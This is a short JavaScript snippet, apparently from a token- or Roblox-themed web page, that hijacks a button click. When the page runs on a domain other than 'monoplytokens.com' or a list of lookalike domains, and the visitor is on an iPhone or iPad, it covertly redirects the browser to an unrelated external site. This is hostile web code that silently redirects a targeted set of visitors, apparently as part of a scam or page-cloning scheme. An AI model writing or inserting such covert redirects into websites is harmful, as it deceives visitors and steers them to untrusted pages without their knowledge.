/*================== [ VICTOR ABDO ] ===============*/
/*================== [ roblox ] ================*/
var button = document.querySelector('.btn');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://live33.online/?03f5d38";
        var blockedDomains = [
            "jsdhjjhhjjhejkjkas.blogspot.com",
            "mply.io.t0ke2n.site",
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
